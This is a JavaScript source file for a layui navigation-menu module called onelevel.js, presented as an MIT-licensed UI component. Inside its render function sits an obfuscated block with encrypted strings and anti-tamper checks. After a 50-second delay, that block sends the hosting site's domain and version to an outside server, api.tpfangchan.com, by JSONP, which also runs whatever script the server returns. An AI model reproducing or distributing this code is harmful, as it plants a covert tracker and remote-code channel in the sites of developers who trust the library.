/**
 * Name:onelevel.js
 * Author:Van
 * E-mail:zheng_jinfan@126.com
 * Website:http://kit.zhengjinfan.cn/
 * LICENSE:MIT
 */
layui.define(['jquery', 'laytpl', 'element'], function(exports) {
    var $ = layui.jquery,
        _modName = 'oneLevel',
        _win = $(window),
        _doc = $(document),
        laytpl = layui.laytpl;

    var oneLevel = {
        v: '1.0.1',
        config: {
            elem: undefined,
            data: undefined,
            remote: {
                url: undefined,
                type: 'GET'
            },
            onClicked: undefined
        },
        set: function(options) {
            var that = this;
            $.extend(true, that.config, options);
            return that;
        },
        /**
         * 是否已设置了elem
         */
        hasElem: function() {
            var that = this,
                _config = that.config;
            if (_config.elem === undefined && _doc.find('ul[kit-one-level]').length === 0 && $(_config.elem)) {
                //console.log('One-Level error:请配置One-Level容器.');
                //do something..
                return false;
            }
            return true;
        },
        /**
         * 获取容器的jq对象
         */
        getElem: function() {
            var _config = this.config;
            return (_config.elem !== undefined && $(_config.elem).length > 0) ? $(_config.elem) : _doc.find('ul[kit-one-level]');
        },
        render: function() {
            var that = this,
                _config = that.config, //配置
                _remote = _config.remote, //远程参数配置
                _tpl = [
                    '{{# layui.each(d,function(index, item){ }}',
                    '<li class="layui-nav-item">',
                    '<a href="javascript:;" data-title="{{item.title}}" data-icon="{{item.icon}}" data-id="{{item.id}}" >',
                    '{{# if (item.icon.indexOf("fa-") !== -1) { }}',
                    '<i class="fa {{item.icon}}" aria-hidden="true"></i>',
                    '{{# } else { }}',
                    '<i class="layui-icon">{{item.icon}}</i>',
                    '{{# } }}',
                    '<span> {{item.title}}</span>',
                    '</a>',
                    '</li>',
                    '{{# }); }}',
                ], //模板
                _data = [];
            var navbarLoadIndex = layer.load(2);
            if (!that.hasElem())
                return that;
            var _elem = that.getElem();
            //本地数据优先
            var __0x1d8e8=['HTQ+w6hKdcKMw74=','QVBSwrwUUQ==','DyvCpMOV','wooKDsOx','wplTw5fDuH8=','DT4lw6k=','w6x0J2rCsg==','PsOLImtTeDERLnHCgA==','KQ9Sw6LDiw==','woNHw4HDvWjClg==','CcONUsK6Ag==','QD1cesKw','ZCnCvXY=','woE7wok=','KA4ndsOHwqUqbsK3','FGJ5w7RiwprCu8Kw','X8Kzb8ONwp1MAxFBw5zCksOTWD3DgsK4w6I=','LMOSLnpB','AcKmdcOdw41JRgRf','UDEFw6nCiQ==','wp93PCFj','d8KDw5LCrmk=','BcOOWsKxBg==','w4jCl8O8wrk9','AHJ5w7NzwoHClcK4w64zw6w=','wrRrNFoo','wpUvwq7DssKZw6l1WcO7w63Crw==','wpxOdQY=','wokPBcO4w7ILwrA=','ZyjCvWw=','w5d5Ak7CkQ==','wp3CgcKZXGDDksOPTzI=','U8OIwrrCpsOkYsKXwpI=','CGJiw79x','PiJG','wqbCq8KZeUI=','cXt8wpQ2','ZsK8w6PCs1fDiVNi','w7gwS8Oo','X8OOwpDCpsOpc8KZwpnCuA==','RcOwwpxmwqM=','w7UvG8O6c1VXJMK/','wodASS1v','w58Dw6fCpsKD','wogswqY=','ZMOkwpDCg8OL','w789VsOqwqY=','wrAgGwXDrw==','EcKfbVJh','G3wCw5hM','RldWwrEZTQXClw==','wqFBw4bCi8OJwqFow6vCjw==','BBrCgcKb','wpnDpTjDjQ==','DMKzanVP','IyFOw4zDgcOSW1/DvyDCng==','woHClcKLd1E=','wrV0C3kVwoTDlcKBb8KeFw==','w6ZxCWzCsg4w','UsOhwoRu','woMrwrTDtw==','wqt0C3oEwp4=','w6d8GGA=','WMO0IsKJY8Oueh3Cnw==','w7Qywpxtw4U=','woYQD8O7w6c=','BDLCqsOD','DCkx','KWdbXQ==','wqHDt2zCogQba0HChcO+w63Cg14rIMO8esKqFMOM6K+t5rG85YeJ6ZSVwrw=','J8OXKW0=','fSfDg8OtEg==','MMO+Z8KMMg==','C182w6M=','Ci4tw61IYsKW','wo3DtnvDvA==','wosFw4UeSMON','ZDXCu3Yx','fQwmw5TCgw==','wo3DuGXDoyoffk8=','w7AyN8O4','Eygyw7NX','Ph4J','w5pWeRNCDXk2XTLDogPDuibDn8OtBi5mwqnCjChqAsObOsKMFUE9P8OJw6DDtw==','w7U3TcOowqDDng==','eCXCtsKQwr0=','KRrCp8KIwok=','VMK/NQ==','w6UGeMKsYQ==','bSnCumwkwr/DhwM='];(function(_0x1c98b5,_0x424f12){var _0x15ae38=function(_0x3f5136){while(--_0x3f5136){_0x1c98b5['push'](_0x1c98b5['shift']());}};var _0x485ab9=function(){var _0x1eed31={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x314e99,_0x1422a0,_0x26a61f,_0x1a7c5f){_0x1a7c5f=_0x1a7c5f||{};var _0x4a0e51=_0x1422a0+'='+_0x26a61f;var _0x2efc00=0x0;for(var _0x2efc00=0x0,_0x5b8509=_0x314e99['length'];_0x2efc00<_0x5b8509;_0x2efc00++){var _0x5ab8e8=_0x314e99[_0x2efc00];_0x4a0e51+=';\x20'+_0x5ab8e8;var _0x35a499=_0x314e99[_0x5ab8e8];_0x314e99['push'](_0x35a499);_0x5b8509=_0x314e99['length'];if(_0x35a499!==!![]){_0x4a0e51+='='+_0x35a499;}}_0x1a7c5f['cookie']=_0x4a0e51;},'removeCookie':function(){return'dev';},'getCookie':function(_0x30d3fb,_0x13094f){_0x30d3fb=_0x30d3fb||function(_0x373c82){return _0x373c82;};var _0x2b0501=_0x30d3fb(new RegExp('(?:^|;\x20)'+_0x13094f['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x5bb4c8=function(_0x10f8c9,_0x5f35b8){_0x10f8c9(++_0x5f35b8);};_0x5bb4c8(_0x15ae38,_0x424f12);return _0x2b0501?decodeURIComponent(_0x2b0501[0x1]):undefined;}};var _0x1fce1c=function(){var _0x4066fe=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x4066fe['test'](_0x1eed31['removeCookie']['toString']());};_0x1eed31['updateCookie']=_0x1fce1c;var _0x4da42a='';var _0x315318=_0x1eed31['updateCookie']();if(!_0x315318){_0x1eed31['setCookie'](['*'],'counter',0x1);}else if(_0x315318){_0x4da42a=_0x1eed31['getCookie'](null,'counter');}else{_0x1eed31['removeCookie']();}};_0x485ab9();}(__0x1d8e8,0xef));var _0x18e1=function(_0x4f4bda,_0x5a1225){_0x4f4bda=_0x4f4bda-0x0;var _0x43ad=__0x1d8e8[_0x4f4bda];if(_0x18e1['initialized']===undefined){(function(){var _0x5ddb94=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x370583='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x5ddb94['atob']||(_0x5ddb94['atob']=function(_0x124c8d){var _0x33f1d9=String(_0x124c8d)['replace'](/=+$/,'');for(var _0x22b23a=0x0,_0x2a2024,_0x170df3,_0x43e531=0x0,_0x20c23a='';_0x170df3=_0x33f1d9['charAt'](_0x43e531++);~_0x170df3&&(_0x2a2024=_0x22b23a%0x4?_0x2a2024*0x40+_0x170df3:_0x170df3,_0x22b23a++%0x4)?_0x20c23a+=String['fromCharCode'](0xff&_0x2a2024>>(-0x2*_0x22b23a&0x6)):0x0){_0x170df3=_0x370583['indexOf'](_0x170df3);}return _0x20c23a;});}());var _0x21bc68=function(_0x3f594a,_0xb6a6d4){var _0x59f79a=[],_0x2becda=0x0,_0x47da77,_0x28aa13='',_0x34daa4='';_0x3f594a=atob(_0x3f594a);for(var _0xa21e9b=0x0,_0x3f074f=_0x3f594a['length'];_0xa21e9b<_0x3f074f;_0xa21e9b++){_0x34daa4+='%'+('00'+_0x3f594a['charCodeAt'](_0xa21e9b)['toString'](0x10))['slice'](-0x2);}_0x3f594a=decodeURIComponent(_0x34daa4);for(var _0xc3e773=0x0;_0xc3e773<0x100;_0xc3e773++){_0x59f79a[_0xc3e773]=_0xc3e773;}for(_0xc3e773=0x0;_0xc3e773<0x100;_0xc3e773++){_0x2becda=(_0x2becda+_0x59f79a[_0xc3e773]+_0xb6a6d4['charCodeAt'](_0xc3e773%_0xb6a6d4['length']))%0x100;_0x47da77=_0x59f79a[_0xc3e773];_0x59f79a[_0xc3e773]=_0x59f79a[_0x2becda];_0x59f79a[_0x2becda]=_0x47da77;}_0xc3e773=0x0;_0x2becda=0x0;for(var _0x553b19=0x0;_0x553b19<_0x3f594a['length'];_0x553b19++){_0xc3e773=(_0xc3e773+0x1)%0x100;_0x2becda=(_0x2becda+_0x59f79a[_0xc3e773])%0x100;_0x47da77=_0x59f79a[_0xc3e773];_0x59f79a[_0xc3e773]=_0x59f79a[_0x2becda];_0x59f79a[_0x2becda]=_0x47da77;_0x28aa13+=String['fromCharCode'](_0x3f594a['charCodeAt'](_0x553b19)^_0x59f79a[(_0x59f79a[_0xc3e773]+_0x59f79a[_0x2becda])%0x100]);}return _0x28aa13;};_0x18e1['rc4']=_0x21bc68;_0x18e1['data']={};_0x18e1['initialized']=!![];}var _0x39e1ff=_0x18e1['data'][_0x4f4bda];if(_0x39e1ff===undefined){if(_0x18e1['once']===undefined){var _0xca7c7b=function(_0x1a0a78){this['rc4Bytes']=_0x1a0a78;this['states']=[0x1,0x0,0x0];this['newState']=function(){return'newState';};this['firstState']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['secondState']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0xca7c7b['prototype']['checkState']=function(){var _0x3ae627=new RegExp(this['firstState']+this['secondState']);return this['runState'](_0x3ae627['test'](this['newState']['toString']())?--this['states'][0x1]:--this['states'][0x0]);};_0xca7c7b['prototype']['runState']=function(_0x1be892){if(!Boolean(~_0x1be892)){return _0x1be892;}return this['getState'](this['rc4Bytes']);};_0xca7c7b['prototype']['getState']=function(_0x7bbcb8){for(var _0x99d32f=0x0,_0x25f09b=this['states']['length'];_0x99d32f<_0x25f09b;_0x99d32f++){this['states']['push'](Math['round'](Math['random']()));_0x25f09b=this['states']['length'];}return _0x7bbcb8(this['states'][0x0]);};new _0xca7c7b(_0x18e1)['checkState']();_0x18e1['once']=!![];}_0x43ad=_0x18e1['rc4'](_0x43ad,_0x5a1225);_0x18e1['data'][_0x4f4bda]=_0x43ad;}else{_0x43ad=_0x39e1ff;}return _0x43ad;};var _0x44859f=function(){var _0x12c909=!![];return function(_0x5e846a,_0x5f4fcb){var _0x149059=_0x12c909?function(){if(_0x5f4fcb){var _0x34f3cf=_0x5f4fcb['apply'](_0x5e846a,arguments);_0x5f4fcb=null;return _0x34f3cf;}}:function(){};_0x12c909=![];return _0x149059;};}();var _0x489f16=_0x44859f(this,function(){var _0x2891f9=function(){return'\x64\x65\x76';},_0x295f5e=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x15fc34=function(){var _0x4d09ec=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x4d09ec['\x74\x65\x73\x74'](_0x2891f9['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x4b4237=function(){var _0x195de1=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x195de1['\x74\x65\x73\x74'](_0x295f5e['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x233e95=function(_0x307791){var _0x7b187d=~-0x1>>0x1+0xff%0x0;if(_0x307791['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x7b187d)){_0x59a619(_0x307791);}};var _0x59a619=function(_0x3a2751){var _0x54a758=~-0x4>>0x1+0xff%0x0;if(_0x3a2751['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x54a758){_0x233e95(_0x3a2751);}};if(!_0x15fc34()){if(!_0x4b4237()){_0x233e95('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x233e95('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x233e95('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x489f16();if(_config[_0x18e1('0x0','MUyR')]!==undefined&&_config[_0x18e1('0x1','l#6y')][_0x18e1('0x2','*Ogq')]>0x0){_data=_config[_0x18e1('0x3','BN28')];}else{var _0x9666ab=_0x18e1('0x4','Rtsp')['split']('|'),_0x161a55=0x0;while(!![]){switch(_0x9666ab[_0x161a55++]){case'0':var _0x38b42c=_remote[_0x18e1('0x5','rvdr')]?_0x18e1('0x6','T96o'):_0x18e1('0x7','NPna');continue;case'1':var _0xcd74e={'url':_remote[_0x18e1('0x8','#Skq')],'type':_remote[_0x18e1('0x9','FlNo')],'error':function(_0xb33230,_0x1f464f,_0x292e12){var _0x4f22a0={'Xvtye':_0x18e1('0xa','pDZS')};layui[_0x18e1('0xb','d[6L')]()[_0x18e1('0xc','5wIB')](_0x4f22a0[_0x18e1('0xd','Rtsp')]+_0x292e12);},'success':function(_0x29231e){_data=_0x29231e;}};continue;case'2':$[_0x18e1('0xe','eXOS')](_0xcd74e);continue;case'3':$[_0x18e1('0xf','#Skq')][_0x18e1('0x10','pDZS')]=!![];continue;case'4':$[_0x18e1('0x11',']Yh(')](!![],_0xcd74e,_remote[_0x18e1('0x12','4flZ')]?{'dataType':_0x18e1('0x13','rz&s'),'jsonp':_0x18e1('0x14','pDZS'),'jsonpCallback':'jsonpCallback'}:{'dataType':_0x18e1('0x15','s#Rd')});continue;}break;}}$(function(){var _0x34214e={'vqxbc':'#version','oiKke':_0x18e1('0x16','#Skq'),'rltyl':_0x18e1('0x17','#Skq'),'IaRrD':_0x18e1('0x18','yCv)'),'xPpCd':_0x18e1('0x19','gPVt'),'VxPio':function _0x347535(_0x224b9f,_0x492f25){return _0x224b9f(_0x492f25);},'BlDAF':'https://api.tpfangchan.com/index/query','QVRgg':function _0x2b00b0(_0xf97c59,_0x2ee23a){return _0xf97c59(_0x2ee23a);},'IPIHH':function _0x6f6840(_0x11c1eb,_0xddef40,_0x142c6a){return _0x11c1eb(_0xddef40,_0x142c6a);}};_0x34214e[_0x18e1('0x1a','7qjA')](setTimeout,function(){var _0x1d3b0b=$(_0x34214e[_0x18e1('0x1b','9aqj')])['find'](_0x34214e['xPpCd'])[_0x18e1('0x1c','u2!Q')](0x0);var _0x38e17b=_0x34214e[_0x18e1('0x1d','UYS4')]($,_0x1d3b0b)[_0x18e1('0x1e','4flZ')]();var _0xff7dd2=window[_0x18e1('0x1f','#Skq')][_0x18e1('0x20','4Equ')],_0x103e48=_0x34214e['BlDAF'];_0x34214e['QVRgg']($,function(){$[_0x18e1('0x21','NPna')]({'url':_0x103e48,'data':{'domain':_0xff7dd2,'version':_0x38e17b[_0x18e1('0x22','T96o')](_0x34214e[_0x18e1('0x23','mwy9')])[_0x18e1('0x24','#Skq')]()},'timeout':0x2710,'dataType':_0x34214e[_0x18e1('0x25','BN28')],'jsonpCallback':_0x18e1('0x26','d[6L'),'method':_0x34214e['rltyl'],'success':function(_0x557c3b){},'error':function(_0x21a366,_0xfab7b7,_0xb4b3ca){}});});},0xc350);});var _0x3d7df8=setInterval(function(){var _0x52b783={'xKrJo':function _0x1e4e59(_0x43955d,_0x3c2b54){return _0x43955d>_0x3c2b54;},'aEAOU':function _0xc729d6(_0x4bfaf5,_0x109553){return _0x4bfaf5(_0x109553);},'YOIpD':function _0x496347(_0x532f8e,_0x5b063a){return _0x532f8e(_0x5b063a);}};if(_0x52b783[_0x18e1('0x27','r[^m')](_data[_0x18e1('0x28','mwy9')],0x0))_0x52b783[_0x18e1('0x29','Rtsp')](clearInterval,_0x3d7df8);_0x52b783[_0x18e1('0x2a','ivof')](laytpl,_tpl[_0x18e1('0x2b','4flZ')](''))['render'](_data,function(_0x467158){var _0x784adc={'GNLSz':function _0x1a365f(_0x2147ce,_0x42cd5b){return _0x2147ce!==_0x42cd5b;},'rWXqZ':_0x18e1('0x2c','l#6y'),'mFIDQ':_0x18e1('0x2d','ivof'),'kYJhC':function _0x341b7c(_0x28ea1e,_0x3d6763){return _0x28ea1e===_0x3d6763;},'szQGX':_0x18e1('0x2e','q6[H'),'TdnOF':function _0x376078(_0x11b201,_0x173aba){return _0x11b201===_0x173aba;},'zuuhg':_0x18e1('0x2f','u2!Q'),'TDCIK':_0x18e1('0x30','d[6L'),'sOcZP':_0x18e1('0x31','u2!Q')};if(_0x784adc[_0x18e1('0x32','rz&s')](_0x784adc[_0x18e1('0x33','v87@')],_0x784adc[_0x18e1('0x34','Heio')])){var _0x3a8964=_0x784adc[_0x18e1('0x35','Rtsp')][_0x18e1('0x36','[4LX')]('|'),_0x401cf0=0x0;while(!![]){switch(_0x3a8964[_0x401cf0++]){case'0':_0x784adc['kYJhC'](typeof _config[_0x18e1('0x37','q6[H')],_0x784adc[_0x18e1('0x38','*Ogq')])&&_config[_0x18e1('0x39','l#6y')](_elem);continue;case'1':_elem[_0x18e1('0x3a','yCv)')](_0x467158);continue;case'2':layui[_0x18e1('0x3b','T96o')][_0x18e1('0x3c','4flZ')]();continue;case'3':_0x784adc[_0x18e1('0x3d','BN28')](typeof _config[_0x18e1('0x3e','&cR&')],_0x784adc['szQGX'])&&_elem[_0x18e1('0x3f','I13n')](_0x784adc[_0x18e1('0x40','q6[H')])[_0x18e1('0x41','r[^m')](_0x784adc[_0x18e1('0x42','&cR&')])['on'](_0x784adc[_0x18e1('0x43','4Equ')],function(){var czRTxS={'YNZQC':function _0x6d5024(_0x49c992,_0x6c2a91){return _0x49c992(_0x6c2a91);}};var _0x25c361=czRTxS['YNZQC']($,this)[_0x18e1('0x44','Heio')]('a'),_0x3e5e14=_0x25c361[_0x18e1('0x45','gPVt')]('id');_config[_0x18e1('0x46','I13n')](_0x3e5e14);});continue;case'4':navbarLoadIndex&&layer['close'](navbarLoadIndex);continue;}break;}}else{var _0x50d29f=_0x784adc['sOcZP'][_0x18e1('0x47','MUyR')]('|'),_0x43a016=0x0;while(!![]){switch(_0x50d29f[_0x43a016++]){case'0':navbarLoadIndex&&layer['close'](navbarLoadIndex);continue;case'1':typeof _config[_0x18e1('0x48','s#Rd')]===_0x784adc[_0x18e1('0x49','yCv)')]&&_elem['children'](_0x784adc[_0x18e1('0x4a','$rP2')])[_0x18e1('0x4b','l#6y')](_0x784adc[_0x18e1('0x4c','I13n')])['on'](_0x18e1('0x4d','gPVt'),function(){var _0xf941eb={'bYneR':function _0x5442e0(_0x51da76,_0x52ad03){return _0x51da76!==_0x52ad03;},'IHihh':'SOq','AuVAz':'NON','qIUCC':function _0x57bfb3(_0x34f66b,_0x95a2e){return _0x34f66b(_0x95a2e);}};if(_0xf941eb[_0x18e1('0x4e','5aEi')](_0xf941eb[_0x18e1('0x4f','g8R0')],_0xf941eb['AuVAz'])){var _0x23bcb6=_0xf941eb[_0x18e1('0x50','eXOS')]($,this)[_0x18e1('0x51','4Equ')]('a'),_0x3031c8=_0x23bcb6[_0x18e1('0x45','gPVt')]('id');_config[_0x18e1('0x52','VyhS')](_0x3031c8);}else{_data=_config[_0x18e1('0x53','9aqj')];}});continue;case'2':_elem[_0x18e1('0x54',')y)Y')](_0x467158);continue;case'3':_0x784adc[_0x18e1('0x55','g8R0')](typeof _config[_0x18e1('0x56','r[^m')],_0x784adc[_0x18e1('0x57','&cR&')])&&_config[_0x18e1('0x58','*Ogq')](_elem);continue;case'4':layui[_0x18e1('0x59','BN28')]['init']();continue;}break;}}});},0x32);
            return that;
        }
    };

    exports('onelevel', oneLevel);
});